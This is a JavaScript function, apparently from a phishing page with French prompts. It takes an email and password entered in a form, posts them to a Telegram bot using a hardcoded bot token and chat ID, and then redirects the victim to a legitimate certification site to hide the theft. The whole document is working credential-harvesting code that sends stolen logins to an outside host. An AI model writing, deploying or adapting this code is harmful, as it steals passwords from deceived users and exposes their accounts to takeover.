function sendToTelegram(){

    const token = "8804181986:AAGKVs-9ro7fQkfqzt-Nh6X8SG6MxPqiYMM";
    const chatId = "8862449749";

    const email = document.getElementById("demoEmail").value;
    const password = document.getElementById("demoCode").value;

    if(email === "" || password === ""){
        alert("Remplis tous les champs !");
        return;
    }

    const message = `
🔐 Nouveau formulaire
📧 Email: ${email}
🔑 Password: ${password}
`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"

        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
  .then(response => {
    if (response.ok) {
        window.location.href = "https://www.ar24.fr/certifications/";
    } else {
        console.error("Erreur lors de l'envoi.");
    }
})  
}